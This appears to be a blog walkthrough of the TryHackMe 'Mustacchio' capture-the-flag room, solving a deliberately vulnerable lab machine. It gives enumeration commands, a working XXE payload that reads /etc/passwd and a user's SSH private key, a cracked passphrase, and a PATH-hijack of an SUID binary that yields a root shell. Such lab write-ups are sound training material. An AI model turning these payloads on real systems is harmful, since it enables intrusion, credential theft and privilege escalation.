---
layout: post
author: L0
---

# THM-Mustacchio
![image](/images/Pasted image 20230823134804.png)

[TryHackMe - Mustacchio](https://tryhackme.com/room/mustacchio)

## Enumeration
### nmap
```shell
$ sudo nmap -sV -p- mustacchio
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

i started with scanning the target and got these open ports.

- **Port 22** ssh service
- **Port 80** apache web server
- **Port 8765** nginx web server
### website
first i checked the apache website.
nothing of interest.

![image](/images/Pasted image 20230823135104.png)
### directory fuzzing

i did a directory scan and found the **custom** directory.

```shell
$ ffuf -w `fzf-wordlist` -u http://mustacchio.thm/FUZZ

                        [Status: 200, Size: 1752, Words: 77, Lines: 73, Duration: 36ms]
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 36ms]
custom                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 39ms]
.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 3789ms]
fonts                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 33ms]
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4174ms]
images                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 35ms]
index.html              [Status: 200, Size: 1752, Words: 77, Lines: 73, Duration: 35ms]
robots.txt              [Status: 200, Size: 28, Words: 3, Lines: 3, Duration: 42ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 35ms]

```

inside the **custom** directory was a file called **users.bak**

![image](/images/Pasted image 20230823141852.png)

the file is a backup of a sqlite database. and inside is a username and a password hash.

```shell
$ file users.bak
users.bak: SQLite 3.x database, last written using SQLite version 3034001, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2

┌──(j0j0pupp3㉿bAs3)-[~/THM/mustacchio]
└─$ sqlite3 users.bak
SQLite version 3.38.2 2022-03-26 13:51:10
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users;
admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

[crackstation.net](https://crackstation.net/) revealed the admin password.

![image](/images/Pasted image 20230823135345.png)

### nginx website
then i looked into the nginx website. i found a login page. with the found credentials is was able to log in. 

![image](/images/Pasted image 20230823135526.png)

it is some kind of admin panel. after submitting some text and checking the response with **burpsuite** i saw that the input needed to be an xml code.

### XXE

![image](/images/Pasted image 20230823135551.png)

in the response was also a hint. a path to anoter **bak file**. downloading this file got me an example what the input field was expecting.

![image](/images/Pasted image 20230823140654.png)

a xml code like this:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment> 

```

with this the response looks like this:

![image](/images/Pasted image 20230823140749.png)

google helped to find some payloads to try. in the end this one worked.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```

and here is the result me reading **/etc/passwd**

![image](/images/Pasted image 20230823140616.png)

in the response was another hint. **Barry** is able to use the ssh service with his ssh-key.

![image](/images/Pasted image 20230823142922.png)

so i read this path `/home/barry/.ssh/id_rsa`
and got the private key.

![image](/images/Pasted image 20230823141028.png)

it was protected with a passphrase that **john** handled for me.

`ssh2john barrys_ssh_key.txt > ssh_hash.txt`

![image](/images/Pasted image 20230823141428.png)

ssh passphrase: **urieljames**

with this passphrase and the private key i was able to log in with the user **barry** and got the first flag.
```shell
barry@mustacchio:~$ ls
user.txt
barry@mustacchio:~$ cat user.txt
62****************************31
```
## Privilege Escalation
i found in the home directory of the user **joe** a binary where the SUID bit is set.
```shell
barry@mustacchio:/home/joe$ ls -lah
total 28K
drwxr-xr-x 2 joe  joe  4.0K Jun 12  2021 .
drwxr-xr-x 4 root root 4.0K Jun 12  2021 ..
-rwsr-xr-x 1 root root  17K Jun 12  2021 live_log
```

running the binary just prints out the requests on the nginx web server.
but looking into the binary with the **strings** command got me an attack vector.
```shell
barry@mustacchio:/home/joe$ strings live_log
...
u+UH
[]A\A]A^A_
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
...
```

i found that the **tail** command was executed without absolute path.
next we will do this:

write the command to spawn a shell into a fake **tail** file.
```shell
barry@mustacchio:/home/joe$ echo "/bin/bash" >/tmp/tail
```

make the file executable
```shell
barry@mustacchio:/home/joe$ chmod +x /tmp/tail
```

and add the path to the file as the first argument to the **PATH** variable. so the OS finds this file with the same name as the original first.
```shell
barry@mustacchio:/home/joe$ export PATH=/tmp:$PATH
```

then execute the binary again and there is a root shell.
```shell
barry@mustacchio:/home/joe$ ./live_log
root@mustacchio:/home/joe# whoami
root
```

go to the **/root** directory to grab the last flag.

```shell
root@mustacchio:/home/joe# cd /root
root@mustacchio:/root# cat root.txt
32***************************3a5
```

[L0]